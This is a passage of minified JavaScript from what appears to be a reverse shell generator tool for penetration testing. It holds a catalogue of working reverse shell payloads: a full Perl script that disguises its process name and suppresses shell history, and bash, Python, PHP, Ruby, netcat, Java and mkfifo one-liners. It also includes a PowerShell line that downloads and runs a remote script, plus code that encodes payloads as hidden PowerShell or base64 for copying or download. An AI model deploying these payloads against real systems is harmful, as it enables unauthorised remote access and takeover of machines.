	if (in_array($pipes[2], $read_a)) {
		$input = fread($pipes[2], $chunk_size);
		fwrite($sock, $input);
	}
}

fclose($sock);
fclose($pipes[0]);
fclose($pipes[1]);
fclose($pipes[2]);
proc_close($process);
?>`,listener:"nc -lvnp {port}",notes:"The legendary PentestMonkey PHP reverse shell file. Ready to save as revshell.php and upload to vulnerable web targets.",extension:".php",isFullScript:!0},{id:"pm-pentestmonkey-perl-reverse-shell-full-file",name:"PentestMonkey Perl Reverse Shell (Full File)",category:"PentestMonkey",language:"Perl",platform:"Linux",command:`#!/usr/bin/perl -w
# perl-reverse-shell - PentestMonkey Reverse Shell in PERL
use strict;
use Socket;
use FileHandle;
use POSIX;

my $ip = '{ip}';
my $port = {port};
my $daemon = 1;
my $fake_process_name = "/usr/sbin/apache";
$0 = "[httpd]";

if ($daemon) {
	my $pid = fork();
	if ($pid) { exit 0; }
	setsid();
	chdir('/');
	umask(0);
}

socket(SOCK, PF_INET, SOCK_STREAM, getprotobyname('tcp'));
if (connect(SOCK, sockaddr_in($port, inet_aton($ip)))) {
	open(STDIN, ">&SOCK");
	open(STDOUT, ">&SOCK");
	open(STDERR, ">&SOCK");
	$ENV{'HISTFILE'} = '/dev/null';
	system("w;uname -a;id;pwd");
	exec({"{shell}"} ($fake_process_name, "-i"));
} else {
	exit 1;
}
`,listener:"nc -lvnp {port}",notes:"Full standalone PentestMonkey Perl reverse shell script with fake process disguise [httpd].",extension:".pl",isFullScript:!0},{id:"pm-pentestmonkey-classic-bash-one-liner",name:"PentestMonkey Classic Bash One-Liner",category:"PentestMonkey",language:"Bash",platform:"Linux",command:"bash -i >& /dev/tcp/{ip}/{port} 0>&1",listener:"nc -lvnp {port}",notes:"Classic PentestMonkey cheat sheet #1 entry.",extension:".sh",isFullScript:!1},{id:"pm-pentestmonkey-classic-perl-one-liner",name:"PentestMonkey Classic Perl One-Liner",category:"PentestMonkey",language:"Perl",platform:"Linux",command:`perl -e 'use Socket;$i="{ip}";$p={port};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("{shell} -i");};'`,listener:"nc -lvnp {port}",notes:"PentestMonkey cheat sheet Perl socket one-liner.",extension:".pl",isFullScript:!1},{id:"pm-pentestmonkey-classic-python-one-liner",name:"PentestMonkey Classic Python One-Liner",category:"PentestMonkey",language:"Python",platform:"Both",command:`python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{ip}",{port}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["{shell}","-i"]);'`,listener:"nc -lvnp {port}",notes:"Classic PentestMonkey Python spawn socket.",extension:".py",isFullScript:!1},{id:"pm-pentestmonkey-classic-php-one-liner",name:"PentestMonkey Classic PHP One-Liner",category:"PentestMonkey",language:"PHP",platform:"Linux",command:`php -r '$sock=fsockopen("{ip}",{port});exec("{shell} -i <&3 >&3 2>&3");'`,listener:"nc -lvnp {port}",notes:"Standard PentestMonkey PHP descriptor redirection.",extension:".php",isFullScript:!1},{id:"pm-pentestmonkey-classic-ruby-one-liner",name:"PentestMonkey Classic Ruby One-Liner",category:"PentestMonkey",language:"Ruby",platform:"Linux",command:`ruby -rsocket -e'f=TCPSocket.open("{ip}",{port}).to_i;exec sprintf("{shell} -i <&%d >&%d 2>&%d",f,f,f)'`,listener:"nc -lvnp {port}",notes:"PentestMonkey TCPSocket spawner.",extension:".rb",isFullScript:!1},{id:"pm-pentestmonkey-netcat-e-flag",name:"PentestMonkey Netcat (-e flag)",category:"PentestMonkey",language:"Netcat",platform:"Linux",command:"nc -e {shell} {ip} {port}",listener:"nc -lvnp {port}",notes:"Traditional netcat execution flag.",extension:".sh",isFullScript:!1},{id:"pm-pentestmonkey-netcat-fifo-mkfifo",name:"PentestMonkey Netcat FIFO (mkfifo)",category:"PentestMonkey",language:"Netcat",platform:"Linux",command:"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|{shell} -i 2>&1|nc {ip} {port} >/tmp/f",listener:"nc -lvnp {port}",notes:"PentestMonkey OpenBSD netcat workaround using named pipe.",extension:".sh",isFullScript:!1},{id:"pm-pentestmonkey-java-runtime-exec",name:"PentestMonkey Java Runtime Exec",category:"PentestMonkey",language:"Java",platform:"Both",command:'r = Runtime.getRuntime(); p = r.exec(["{shell}","-c","exec 5<>/dev/tcp/{ip}/{port};cat <&5 | while read line; do \\$line 2>&5 >&5; done"] as String[]); p.waitFor()',listener:"nc -lvnp {port}",notes:"PentestMonkey Java exec connector.",extension:".java",isFullScript:!1},{id:"pm-pentestmonkey-xterm-display-shell",name:"PentestMonkey XTerm Display Shell",category:"PentestMonkey",language:"Other",platform:"Linux",command:"xterm -display {ip}:1",listener:"Xnest :1 (or Xming on Windows)",notes:"Connects an interactive X11 terminal session back to listener.",extension:".sh",isFullScript:!1},{id:"tty-python-pty-spawn-interactive-bash",name:"Python PTY Spawn (Interactive Bash)",category:"TTY",language:"TTY Upgrade",platform:"Linux",command:`# Step 1: In the reverse shell session, spawn a PTY:
python3 -c 'import pty; pty.spawn("/bin/bash")' || python -c 'import pty; pty.spawn("/bin/bash")'

# Step 2: Background the shell:
# Press: Ctrl + Z

# Step 3: In attacker local terminal, disable echoing and bring back:
stty raw -echo; fg

# Step 4: Reset terminal type and dimensions:
reset
export TERM=xterm-256color
export SHELL=/bin/bash
stty rows 38 cols 116`,listener:"nc -lvnp {port}",notes:"Standard industry PTY upgrade. Gives full tab completion, Ctrl+C handling, and clear screen.",extension:".sh",isFullScript:!0},{id:"tty-script-dev-null-pty-spawn",name:"Script /dev/null PTY Spawn",category:"TTY",language:"TTY Upgrade",platform:"Linux",command:`# When python is not available, use script:
/usr/bin/script -qc /bin/bash /dev/null

# Background with Ctrl + Z, then on attacker machine:
stty raw -echo; fg
reset
export TERM=xterm-256color
export SHELL=/bin/bash`,listener:"nc -lvnp {port}",notes:"PTY allocation using Linux script utility when Python is absent.",extension:".sh",isFullScript:!0},{id:"tty-socat-full-interactive-tty",name:"Socat Full Interactive TTY",category:"TTY",language:"TTY Upgrade",platform:"Linux",command:`# Attacker listener:
socat file:\`tty\`,raw,echo=0 TCP-L:{port}

# Target reverse connection:
socat TCP:{ip}:{port} EXEC:'/bin/bash -li',pty,stderr,setsid,sigint,sane`,listener:"socat file:`tty`,raw,echo=0 TCP-L:{port}",notes:"Instant flawless PTY with no backgrounding or stty manipulation needed.",extension:".sh",isFullScript:!0},{id:"tty-windows-conptyshell-interactive-tty",name:"Windows ConPtyShell Interactive TTY",category:"TTY",language:"TTY Upgrade",platform:"Windows",command:`# Attacker listener setup (set rows and cols):
stty raw -echo; (stty size; cat) | nc -lvnp {port}

# Target PowerShell execution:
IEX(IWR https://raw.githubusercontent.com/antonioCoco/ConPtyShell/master/Invoke-ConPtyShell.ps1 -UseBasicParsing); Invoke-ConPtyShell {ip} {port}`,listener:"stty raw -echo; (stty size; cat) | nc -lvnp {port}",notes:"ConPty creates a true pseudo-console on modern Windows (Build 1809+), supporting colors, arrows, and Ctrl+C.",extension:".ps1",isFullScript:!0},{id:"tty-instant-terminal-geometry-sync",name:"Instant Terminal Geometry Sync",category:"TTY",language:"TTY Upgrade",platform:"Linux",command:`# Run on attacker terminal to get current geometry:
stty size

# In the target reverse shell, apply rows & cols:
stty rows 40 cols 140; export TERM=xterm-256color`,listener:"nc -lvnp {port}",notes:"Fixes Nano, Vim, and text wrapping issues when editing files in a reverse shell.",extension:".sh",isFullScript:!1}],ee=["4444","443","80","9001","8080","1337"],te=[{id:"nc",label:"nc -lvnp"},{id:"rlwrap",label:"rlwrap nc"},{id:"ncat",label:"ncat"},{id:"ncat-ssl",label:"ncat (SSL)"},{id:"rustcat",label:"rustcat"},{id:"pwncat",label:"pwncat"},{id:"socat",label:"socat"},{id:"powercat",label:"powercat"}],me=({initialCategory:re})=>{const{globalVars:g,setGlobalVars:P,soundEnabled:n}=Q(),y=g.lhost||"10.10.14.x",p=g.lport||"4444",T=g.targetIp,S=e=>P({lhost:e}),$=e=>P({lport:e}),[x,M]=a.useState("rev-bash-i"),[b,B]=a.useState("/bin/bash"),[l,A]=a.useState("All"),[m,_]=a.useState(""),[c,W]=a.useState("RAW"),[h,j]=a.useState("none"),[v,U]=a.useState("nc"),[C,R]=a.useState(!1),[O,L]=a.useState(!1),s=a.useMemo(()=>f.find(e=>e.id===x)||f[0],[x]),w=a.useMemo(()=>{let e=f;if(l==="Linux"?e=e.filter(r=>r.platform==="Linux"||r.platform==="Both"||r.platform==="All"):l==="Windows"?e=e.filter(r=>r.platform==="Windows"||r.platform==="Both"||r.platform==="All"):l==="Web"?e=e.filter(r=>r.language==="PHP"||r.language==="JSP"||r.language==="Node.js"||r.language==="Java"||r.name.toLowerCase().includes("php")||r.name.toLowerCase().includes("web")):l==="PentestMonkey"?e=e.filter(r=>r.category==="PentestMonkey"):l==="MSFVenom"?e=e.filter(r=>r.category==="MSFVenom"):l==="HoaxShell"?e=e.filter(r=>r.category==="HoaxShell"):l==="TTY"&&(e=e.filter(r=>r.category==="TTY")),m.trim()){const r=m.toLowerCase().trim();e=e.filter(o=>o.name.toLowerCase().includes(r)||o.language.toLowerCase().includes(r)||o.command.toLowerCase().includes(r)||o.notes&&o.notes.toLowerCase().includes(r))}return e},[l,m]),k=a.useMemo(()=>{const e=s.command.replace(/{ip}/g,y).replace(/{port}/g,p).replace(/{shell}/g,b||"/bin/bash");let r=e;if(h==="bash -c"?r=`bash -c '${e.replace(/'/g,"'\\''")}'`:h==="cmd /c"&&(r=`cmd.exe /c "${e.replace(/"/g,'"')}"`),c==="URL")return encodeURIComponent(r);if(c==="BASE64")try{return btoa(unescape(encodeURIComponent(r)))}catch{return btoa(r)}else if(c==="BASH_B64")try{return`echo "${btoa(unescape(encodeURIComponent(r)))}" | base64 -d | bash`}catch{return r}else if(c==="PS_ENC")try{let o="";for(let d=0;d<r.length;d++)o+=r.charAt(d)+"\0";return`powershell -nop -w hidden -enc ${btoa(o)}`}catch{return r}return r},[s,y,p,b,h,c]),E=a.useMemo(()=>{const e=p;switch(v){case"nc":return`nc -lvnp ${e}`;case"rlwrap":return`rlwrap nc -lvnp ${e}`;case"ncat":return`ncat -lvnp ${e}`;case"ncat-ssl":return`ncat --ssl -lvnp ${e}`;case"rustcat":return`rcat -l -p ${e}`;case"pwncat":return`python3 -m pwncat -lp ${e}`;case"socat":return`socat file:\`tty\`,raw,echo=0 tcp-listen:${e}`;case"powercat":return`powercat -l -p ${e}`;default:return`nc -lvnp ${e}`}},[v,p]),N=e=>{const r=parseInt(p,10)||4444,o=Math.max(1,Math.min(65535,r+e));$(o.toString()),n&&i("toggle")},D=()=>{H(k),R(!0),n&&i("flag"),setTimeout(()=>R(!1),2e3)},z=()=>{H(E),L(!0),n&&i("click"),setTimeout(()=>L(!1),2e3)},G=()=>{const e=s.extension||".sh",r=`${s.name.toLowerCase().replace(/[^a-z0-9_-]+/g,"-")}${e}`,o=new Blob([k],{type:"text/plain;charset=utf-8"}),d=URL.createObjectURL(o),u=document.createElement("a");u.href=d,u.download=r,document.body.appendChild(u),u.click(),document.body.removeChild(u),URL.revokeObjectURL(d),n&&i("export")};return t.jsxs("div",{className:"space-y-3 font-mono text-xs",children:[t.jsxs("div",{className:"p-2.5 sm:p-3 rounded-xl bg-white dark:bg-cyber-card border border-slate-200 dark:border-cyber-border/80 shadow-sm flex flex-wrap items-center justify-between gap-3",children:[t.jsxs("div",{className:"flex items-center gap-2",children:[t.jsxs("span",{className:"text-[11px] font-bold text-cyan-700 dark:text-cyber-cyan uppercase tracking-wider flex items-center gap-1",children:[t.jsx(V,{className:"w-3.5 h-3.5 text-cyan-600 dark:text-cyber-cyan"}),"LHOST:"]}),t.jsx("div",{className:"inline-flex items-center h-8 rounded-lg bg-slate-100 dark:bg-slate-950/80 border border-slate-300 dark:border-slate-800 px-2 shadow-inner focus-within:border-cyan-500 dark:focus-within:border-cyber-cyan focus-within:ring-1 focus-within:ring-cyan-500/30 transition-all",children:t.jsx("input",{type:"text",id:"revshell-lhost-input",name:"revshell-lhost","aria-label":"Reverse Shell LHOST",value:y,onChange:e=>S(e.target.value),placeholder:"10.10.14.x",className:"w-32 h-7 bg-transparent text-slate-900 dark:text-white text-xs font-mono font-bold focus:outline-none placeholder-slate-400 dark:placeholder-slate-600",title:"Attacker IP / Tun0 interface IP"})}),T&&t.jsx("button",{type:"button",onClick:()=>{S(T),n&&i("toggle")},className:"h-8 px-2.5 flex items-center rounded-lg bg-slate-100 hover:bg-slate-200 dark:bg-slate-950/80 dark:hover:bg-slate-800 border border-slate-300 dark:border-slate-800 text-[10px] font-mono font-bold text-slate-700 dark:text-slate-300 hover:text-cyan-700 dark:hover:text-cyber-cyan transition-all active:scale-95",title:"Set to Active Target IP",children:"TARGET"}),t.jsx("button",{type:"button",onClick:()=>{S("127.0.0.1"),n&&i("toggle")},className:"h-8 px-2 flex items-center rounded-lg bg-slate-100 hover:bg-slate-200 dark:bg-slate-950/80 dark:hover:bg-slate-800 border border-slate-300 dark:border-slate-800 text-[10px] font-mono font-bold text-slate-700 dark:text-slate-300 hover:text-cyan-700 dark:hover:text-cyber-cyan transition-all active:scale-95",title:"Set to localhost",children:"127.0.0.1"})]}),t.jsxs("div",{className:"flex items-center gap-2",children:[t.jsx("span",{className:"text-[11px] font-bold text-emerald-700 dark:text-cyber-emerald uppercase tracking-wider",children:"LPORT:"}),t.jsxs("div",{className:"inline-flex items-center h-8 rounded-lg bg-slate-100 dark:bg-slate-950/80 border border-slate-300 dark:border-slate-800 p-0.5 shadow-inner focus-within:border-emerald-500 dark:focus-within:border-cyber-emerald focus-within:ring-1 focus-within:ring-emerald-500/30 transition-all",children:[t.jsx("button",{type:"button",onClick:()=>N(-1),className:"w-7 h-7 flex items-center justify-center rounded-md text-slate-500 dark:text-slate-400 hover:text-slate-900 dark:hover:text-white hover:bg-white dark:hover:bg-slate-800 transition-all active:scale-95",title:"Decrease port (-1)",children:t.jsx(q,{className:"w-3.5 h-3.5 stroke-[2.5]"})}),t.jsx("input",{type:"text",id:"revshell-lport-input",name:"revshell-lport","aria-label":"Reverse Shell LPORT",value:p,onChange:e=>$(e.target.value),placeholder:"4444",className:"w-14 h-7 text-center bg-transparent text-emerald-800 dark:text-cyber-emerald text-xs font-mono font-bold tracking-wider focus:outline-none selection:bg-emerald-500/30"}),t.jsx("button",{type:"button",onClick:()=>N(1),className:"w-7 h-7 flex items-center justify-center rounded-md text-slate-500 dark:text-slate-400 hover:text-slate-900 dark:hover:text-white hover:bg-white dark:hover:bg-slate-800 transition-all active:scale-95",title:"Increase port (+1)",children:t.jsx(K,{className:"w-3.5 h-3.5 stroke-[2.5]"})})]}),t.jsx("div",{className:"hidden sm:inline-flex items-center gap-1 p-0.5 rounded-lg bg-slate-100/80 dark:bg-slate-950/60 border border-slate-200 dark:border-slate-800/80",children:ee.map(e=>{const r=p===e;return t.jsx("button",{type:"button",onClick:()=>{$(e),n&&i("toggle")},className:`h-7 px-2.5 flex items-center justify-center rounded-md text-[11px] font-mono font-bold transition-all active:scale-95 ${r?"bg-emerald-600 dark:bg-cyber-emerald text-white dark:text-slate-950 shadow-[0_0_10px_rgba(16,185,129,0.35)] dark:shadow-[0_0_12px_rgba(0,255,159,0.4)]":"text-slate-600 dark:text-slate-400 hover:text-slate-900 dark:hover:text-white hover:bg-white dark:hover:bg-slate-800/80"}`,children:e},e)})})]}),t.jsxs("div",{className:"flex items-center gap-1.5",children:[t.jsx("span",{className:"text-[11px] font-bold text-purple-700 dark:text-purple-400 uppercase tracking-wider",children:"SHELL:"}),t.jsx("div",{className:"inline-flex items-center gap-1 p-0.5 rounded-lg bg-slate-100/80 dark:bg-slate-950/60 border border-slate-200 dark:border-slate-800/80",children:["/bin/bash","/bin/sh","powershell","cmd.exe"].map(e=>{const r=b===e;return t.jsx("button",{type:"button",onClick:()=>{B(e),n&&i("toggle")},className:`h-7 px-2 flex items-center rounded-md text-[11px] font-mono transition-all active:scale-95 ${r?"bg-purple-600 dark:bg-cyber-purple text-white dark:text-slate-950 font-bold shadow-[0_0_10px_rgba(168,85,247,0.35)] dark:shadow-[0_0_12px_rgba(176,38,255,0.4)]":"text-slate-600 dark:text-slate-400 hover:text-slate-900 dark:hover:text-white hover:bg-white dark:hover:bg-slate-800/80 font-medium"}`,children:e.replace("/bin/","")},e)})})]})]}),t.jsxs("div",{className:"flex flex-wrap items-center justify-between gap-2",children:[t.jsx("div",{className:"flex items-center gap-1 overflow-x-auto pb-1 max-w-full scrollbar-none",children:[{id:"All",label:"All",count:f.length},{id:"Linux",label:"🐧 Linux"},{id:"Windows",label:"🪟 Windows"},{id:"Web",label:"🌐 Web/PHP"},{id:"PentestMonkey",label:"🐒 PentestMonkey"},{id:"MSFVenom",label:"💣 MSFVenom"},{id:"HoaxShell",label:"🛡️ HoaxShell"},{id:"TTY",label:"📟 TTY"}].map(e=>t.jsxs("button",{onClick:()=>{A(e.id),n&&i("toggle")},className:`px-2.5 py-1 rounded-lg text-xs font-mono font-semibold whitespace-nowrap transition-all ${l===e.id?"bg-cyan-500 text-black shadow-glow-cyan/20 font-bold":"bg-cyber-card hover:bg-cyber-border border border-cyber-border text-cyber-muted hover:text-slate-900 dark:hover:text-white"}`,children:[e.label,"count"in e&&t.jsxs("span",{className:"ml-1 opacity-70",children:["(",e.count,")"]})]},e.id))}),t.jsxs("div",{className:"relative flex-1 sm:max-w-xs min-w-[200px]",children:[t.jsx(Y,{className:"w-3.5 h-3.5 absolute left-2.5 top-1/2 -translate-y-1/2 text-cyber-muted"}),t.jsx("input",{type:"text",id:"revshell-search-input",name:"revshell-search","aria-label":"Filter reverse shell payloads",value:m,onChange:e=>_(e.target.value),placeholder:`Filter ${w.length} payloads...`,className:"w-full pl-8 pr-7 py-1 rounded-lg bg-cyber-card border border-cyber-border text-xs text-slate-900 dark:text-white placeholder-cyber-muted focus:border-cyber-cyan focus:outline-none"}),m&&t.jsx("button",{onClick:()=>_(""),className:"absolute right-2 top-1/2 -translate-y-1/2 text-cyber-muted hover:text-slate-900 dark:hover:text-white",children:t.jsx(X,{className:"w-3.5 h-3.5"})})]})]}),t.jsx("div",{className:"p-2 rounded-xl bg-cyber-card/60 border border-cyber-border/70 max-h-36 overflow-y-auto scrollbar-thin",children:t.jsx("div",{className:"flex flex-wrap gap-1.5",children:w.length===0?t.jsx("div",{className:"text-cyber-muted text-xs p-2",children:"No reverse shells matched your query."}):w.map(e=>{const r=e.id===x;return t.jsxs("button",{onClick:()=>{M(e.id),n&&i("click")},className:`px-2 py-1 rounded-md text-xs font-mono transition-all flex items-center gap-1.5 ${r?"bg-emerald-500 dark:bg-cyber-emerald text-black font-bold shadow-sm":"bg-slate-100 dark:bg-cyber-bg hover:bg-slate-200 dark:hover:bg-cyber-card border border-slate-300 dark:border-cyber-border text-slate-800 dark:text-slate-300 hover:text-slate-950 dark:hover:text-white"}`,title:`${e.name} (${e.language}) - ${e.platform}`,children:[t.jsx("span",{children:e.name}),e.isFullScript&&t.jsx("span",{className:`text-[9px] px-1 py-0.2 rounded uppercase ${r?"bg-black/20 text-black":"bg-purple-100 dark:bg-cyber-purple/20 text-purple-900 dark:text-cyber-purple"}`,children:"FILE"})]},e.id)})})}),t.jsxs("div",{className:"rounded-xl bg-white dark:bg-cyber-card border border-cyan-400/50 dark:border-cyber-cyan/40 shadow-lg overflow-hidden",children:[t.jsxs("div",{className:"px-3.5 py-2 bg-slate-100 dark:bg-cyber-bg/95 border-b border-slate-200 dark:border-cyber-border flex flex-wrap items-center justify-between gap-2",children:[t.jsxs("div",{className:"flex items-center gap-2 min-w-0",children:[t.jsx("span",{className:"w-2 h-2 rounded-full bg-cyber-cyan animate-pulse"}),t.jsx("span",{className:"font-bold text-slate-900 dark:text-white text-xs truncate",children:s.name}),t.jsx("span",{className:"text-[10px] px-1.5 py-0.2 rounded bg-cyan-100 dark:bg-cyber-cyan/10 border border-cyan-300 dark:border-cyber-cyan/30 text-cyan-900 dark:text-cyber-cyan font-bold",children:s.platform}),t.jsx("span",{className:"text-[10px] px-1.5 py-0.2 rounded bg-purple-100 dark:bg-cyber-purple/10 border border-purple-300 dark:border-cyber-purple/30 text-purple-900 dark:text-cyber-purple font-mono",children:s.language}),s.notes&&t.jsxs("span",{className:"text-[10px] text-slate-600 dark:text-cyber-muted truncate hidden md:inline",children:["(",s.notes,")"]})]}),t.jsxs("div",{className:"flex items-center gap-2",children:[t.jsx("div",{className:"flex items-center gap-0.5 bg-slate-200/70 dark:bg-cyber-card border border-slate-300 dark:border-cyber-border rounded-lg p-0.5",children:["RAW","URL","BASE64","BASH_B64","PS_ENC"].map(e=>t.jsx("button",{onClick:()=>{W(e),n&&i("toggle")},className:`px-1.5 py-0.5 rounded text-[10px] font-mono transition-colors ${c===e?"bg-cyber-cyan text-black font-bold":"text-slate-600 dark:text-cyber-muted hover:text-slate-900 dark:hover:text-white"}`,children:e.replace("_"," ")},e))}),t.jsx("div",{className:"hidden lg:flex items-center gap-0.5 bg-slate-200/70 dark:bg-cyber-card border border-slate-300 dark:border-cyber-border rounded-lg p-0.5",children:["none","bash -c","cmd /c"].map(e=>t.jsx("button",{onClick:()=>{j(e),n&&i("toggle")},className:`px-1.5 py-0.5 rounded text-[10px] font-mono transition-colors ${h===e?"bg-cyber-purple text-white font-bold":"text-slate-600 dark:text-cyber-muted hover:text-slate-900 dark:hover:text-white"}`,children:e==="none"?"RAW":e},e))}),(s.isFullScript||s.extension)&&t.jsxs("button",{onClick:G,className:"px-2 py-1 rounded-lg bg-slate-100 hover:bg-slate-200 dark:bg-cyber-bg dark:hover:bg-cyber-border border border-slate-300 dark:border-cyber-border text-slate-800 dark:text-white text-xs font-bold flex items-center gap-1 transition-colors",title:`Download as ${s.extension||".sh"} file`,children:[t.jsx(J,{className:"w-3.5 h-3.5 text-cyber-cyan"}),t.jsxs("span",{className:"hidden sm:inline",children:["Save ",s.extension]})]}),t.jsx("button",{onClick:D,className:`px-3 py-1 rounded-lg font-bold text-xs transition-all flex items-center gap-1.5 shadow-sm ${C?"bg-cyber-emerald text-black shadow-glow-emerald/30":"bg-cyber-cyan hover:bg-cyber-cyan/90 text-black shadow-glow-cyan/20"}`,children:C?t.jsxs(t.Fragment,{children:[t.jsx(I,{className:"w-3.5 h-3.5"}),t.jsx("span",{children:"COPIED!"})]}):t.jsxs(t.Fragment,{children:[t.jsx(F,{className:"w-3.5 h-3.5"}),t.jsx("span",{children:"COPY PAYLOAD"})]})})]})]}),t.jsx("div",{className:"p-3 bg-slate-950 border-t border-slate-800 font-mono text-xs overflow-x-auto max-h-72 scrollbar-thin",children:t.jsx("pre",{className:"text-emerald-400 whitespace-pre-wrap break-all leading-relaxed select-all",children:k})})]}),t.jsxs("div",{className:"p-2.5 rounded-xl bg-white dark:bg-cyber-card border border-slate-200 dark:border-cyber-border flex flex-wrap items-center justify-between gap-2",children:[t.jsxs("div",{className:"flex items-center gap-2 min-w-0",children:[t.jsx(Z,{className:"w-4 h-4 text-emerald-600 dark:text-cyber-emerald flex-shrink-0"}),t.jsx("span",{className:"text-[11px] font-bold text-emerald-800 dark:text-cyber-emerald uppercase",children:"LISTENER:"}),t.jsx("div",{className:"flex items-center gap-1 overflow-x-auto max-w-md scrollbar-none",children:te.map(e=>t.jsx("button",{onClick:()=>{U(e.id),n&&i("toggle")},className:`px-1.5 py-0.5 rounded text-[10px] font-mono whitespace-nowrap transition-colors ${v===e.id?"bg-emerald-100 dark:bg-cyber-emerald/20 text-emerald-900 dark:text-cyber-emerald border border-emerald-300 dark:border-cyber-emerald/60 font-bold":"bg-slate-100 hover:bg-slate-200 dark:bg-cyber-bg dark:hover:bg-cyber-card text-slate-600 dark:text-cyber-muted hover:text-slate-900 dark:hover:text-white border border-slate-200 dark:border-cyber-border"}`,children:e.label},e.id))})]}),t.jsxs("div",{className:"flex items-center gap-2",children:[t.jsx("code",{className:"px-2.5 py-1 rounded bg-slate-950 border border-slate-800 text-emerald-400 font-mono text-xs select-all",children:E}),t.jsx("button",{onClick:z,className:`p-1.5 rounded-lg border transition-all ${O?"bg-cyber-emerald text-black border-cyber-emerald":"bg-slate-100 hover:bg-slate-200 dark:bg-cyber-bg dark:hover:bg-cyber-border text-slate-700 dark:text-white border-slate-300 dark:border-cyber-border"}`,title:"Copy listener command",children:O?t.jsx(I,{className:"w-3.5 h-3.5"}):t.jsx(F,{className:"w-3.5 h-3.5"})})]})]})]})};export{me as ReverseShellGenerator};
